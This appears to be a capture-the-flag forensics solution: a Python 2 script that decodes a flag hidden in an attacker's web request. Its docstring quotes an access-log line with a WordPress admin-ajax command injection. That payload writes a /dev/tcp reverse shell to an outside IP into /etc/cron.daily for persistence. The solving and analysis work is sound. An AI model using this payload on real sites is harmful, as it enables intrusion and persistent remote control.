'''
search base64
or search /dev/tcp, some keywords usually used in injection/attack.

GET /wordpress/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:echo%20%22sh%20-i%20%3E&%20/dev/tcp/82.179.92.206/7331%200%3E&1%22%20%3E%20/etc/cron.daily/testconnect%20&&%20Nz=Eg1n;az=5bDRuQ;Mz=fXIzTm;Kz=F9nMEx;Oz=7QlRI;Tz=4xZ0Vi;Vz=XzRfdDV;echo%20$Mz$Tz$Vz$az$Kz$Oz|base64%20-d|rev:NULL:NULL HTTP/1.1" 200 512 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
'''
from base64 import b64decode

Nz="Eg1n"
az="5bDRuQ"
Mz="fXIzTm"
Kz="F9nMEx"
Oz="7QlRI"
Tz="4xZ0Vi"
Vz="XzRfdDV"

flag = b64decode(Mz+Tz+Vz+az+Kz+Oz)

print flag[::-1]
